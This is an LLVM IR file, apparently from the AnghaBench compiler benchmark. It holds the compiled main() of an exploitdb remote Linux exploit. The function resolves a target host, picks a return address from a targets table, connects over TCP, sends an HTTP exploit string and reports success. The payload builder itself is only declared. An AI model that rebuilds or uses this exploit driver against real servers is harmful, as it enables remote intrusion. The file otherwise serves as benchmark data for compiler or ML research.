; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_580.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_580.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64 }
%struct.sockaddr_in = type { i32, i32, %struct.in_addr }
%struct.in_addr = type { i32 }
%struct.hostent = type { i64 }
%struct.sockaddr = type { i32 }

@MAX_ARCH = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [18 x i8] c"- Invalid target\0A\00", align 1
@targets = common dso_local global %struct.TYPE_2__* null, align 8
@.str.1 = private unnamed_addr constant [15 x i8] c"-Using RET %p\0A\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"Resolving %s\09\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"[ERROR]\0AUnable to resolve: %s\0A\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"[DONE]\0A\00", align 1
@BUFF_SIZE = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"malloc\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.7 = private unnamed_addr constant [21 x i8] c"Connecting to %s:%d\09\00", align 1
@.str.8 = private unnamed_addr constant [34 x i8] c"[ERROR]\0AUnable to connect: %s:%d\0A\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.10 = private unnamed_addr constant [34 x i8] c"Successfully send exploit string\0A\00", align 1
@.str.11 = private unnamed_addr constant [31 x i8] c"Failed sending exploit string\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = load i32, i32* %4, align 4
  %15 = icmp ne i32 %14, 4
  br i1 %15, label %16, label %22

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @show_help(i8* %19, i32 1)
  %21 = call i32 @exit(i32 1) #4
  unreachable

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  store i8* %25, i8** %6, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 2
  %28 = load i8*, i8** %27, align 8
  %29 = call i8* @atoi(i8* %28)
  %30 = ptrtoint i8* %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 3
  %33 = load i8*, i8** %32, align 8
  %34 = call i8* @atoi(i8* %33)
  %35 = ptrtoint i8* %34 to i32
  store i32 %35, i32* %12, align 4
  %36 = load i32, i32* %12, align 4
  %37 = load i32, i32* @MAX_ARCH, align 4
  %38 = icmp uge i32 %36, %37
  br i1 %38, label %42, label %39

39:                                               ; preds = %22
  %40 = load i32, i32* %12, align 4
  %41 = icmp ult i32 %40, 0
  br i1 %41, label %42, label %49

42:                                               ; preds = %39, %22
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i64 0, i64 0))
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 0
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @show_help(i8* %46, i32 1)
  %48 = call i32 @exit(i32 1) #4
  unreachable

49:                                               ; preds = %39
  %50 = load %struct.TYPE_2__*, %struct.TYPE_2__** @targets, align 8
  %51 = load i32, i32* %12, align 4
  %52 = zext i32 %51 to i64
  %53 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %50, i64 %52
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %53, i32 0, i32 0
  %55 = load i64, i64* %54, align 8
  store i64 %55, i64* %13, align 8
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 0
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @show_help(i8* %58, i32 0)
  %60 = load i64, i64* %13, align 8
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i64 %60)
  %62 = load i8*, i8** %6, align 8
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.2, i64 0, i64 0), i8* %62)
  %64 = load i8*, i8** %6, align 8
  %65 = call %struct.hostent* @gethostbyname(i8* %64)
  store %struct.hostent* %65, %struct.hostent** %11, align 8
  %66 = load %struct.hostent*, %struct.hostent** %11, align 8
  %67 = icmp ne %struct.hostent* %66, null
  br i1 %67, label %72, label %68

68:                                               ; preds = %49
  %69 = load i8*, i8** %6, align 8
  %70 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8* %69)
  %71 = call i32 @exit(i32 1) #4
  unreachable

72:                                               ; preds = %49
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  br label %74

74:                                               ; preds = %72
  %75 = load i32, i32* @BUFF_SIZE, align 4
  %76 = call i64 @malloc(i32 %75)
  %77 = inttoptr i64 %76 to i8*
  store i8* %77, i8** %7, align 8
  %78 = load i8*, i8** %7, align 8
  %79 = icmp ne i8* %78, null
  br i1 %79, label %83, label %80

80:                                               ; preds = %74
  %81 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  %82 = call i32 @exit(i32 1) #4
  unreachable

83:                                               ; preds = %74
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %85 = load %struct.hostent*, %struct.hostent** %11, align 8
  %86 = getelementptr inbounds %struct.hostent, %struct.hostent* %85, i32 0, i32 0
  %87 = load i64, i64* %86, align 8
  %88 = inttoptr i64 %87 to %struct.in_addr*
  %89 = bitcast %struct.in_addr* %84 to i8*
  %90 = bitcast %struct.in_addr* %88 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %89, i8* align 4 %90, i64 4, i1 false)
  %91 = load i32, i32* @AF_INET, align 4
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i32 %91, i32* %92, align 4
  %93 = load i32, i32* %8, align 4
  %94 = call i32 @htons(i32 %93)
  %95 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i32 %94, i32* %95, align 4
  %96 = load i32, i32* @AF_INET, align 4
  %97 = load i32, i32* @SOCK_STREAM, align 4
  %98 = load i32, i32* @IPPROTO_TCP, align 4
  %99 = call i32 @socket(i32 %96, i32 %97, i32 %98)
  store i32 %99, i32* %9, align 4
  %100 = icmp slt i32 %99, 0
  br i1 %100, label %101, label %104

101:                                              ; preds = %83
  %102 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  %103 = call i32 @exit(i32 1) #4
  unreachable

104:                                              ; preds = %83
  %105 = load i8*, i8** %6, align 8
  %106 = load i32, i32* %8, align 4
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.7, i64 0, i64 0), i8* %105, i32 %106)
  %108 = load i32, i32* %9, align 4
  %109 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %110 = call i64 @connect(i32 %108, %struct.sockaddr* %109, i32 12)
  %111 = icmp slt i64 %110, 0
  br i1 %111, label %112, label %118

112:                                              ; preds = %104
  %113 = load i8*, i8** %6, align 8
  %114 = load i32, i32* %8, align 4
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.8, i64 0, i64 0), i8* %113, i32 %114)
  %116 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0))
  %117 = call i32 @exit(i32 1) #4
  unreachable

118:                                              ; preds = %104
  %119 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  br label %120

120:                                              ; preds = %118
  %121 = load i8*, i8** %7, align 8
  %122 = load i32, i32* @BUFF_SIZE, align 4
  %123 = load i8*, i8** %6, align 8
  %124 = call i32 @make_http_request(i8* %121, i32 %122, i8* %123, i64* %13)
  %125 = load i32, i32* %9, align 4
  %126 = load i8*, i8** %7, align 8
  %127 = load i8*, i8** %7, align 8
  %128 = call i64 @strlen(i8* %127)
  %129 = call i64 @send(i32 %125, i8* %126, i64 %128, i32 0)
  %130 = load i8*, i8** %7, align 8
  %131 = call i64 @strlen(i8* %130)
  %132 = icmp eq i64 %129, %131
  br i1 %132, label %133, label %135

133:                                              ; preds = %120
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.10, i64 0, i64 0))
  br label %137

135:                                              ; preds = %120
  %136 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.11, i64 0, i64 0))
  br label %137

137:                                              ; preds = %135, %133
  %138 = load i32, i32* %9, align 4
  %139 = call i32 @close(i32 %138)
  ret i32 0
}

declare dso_local i32 @show_help(i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @atoi(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @make_http_request(i8*, i32, i8*, i64*) #1

declare dso_local i64 @send(i32, i8*, i64, i32) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
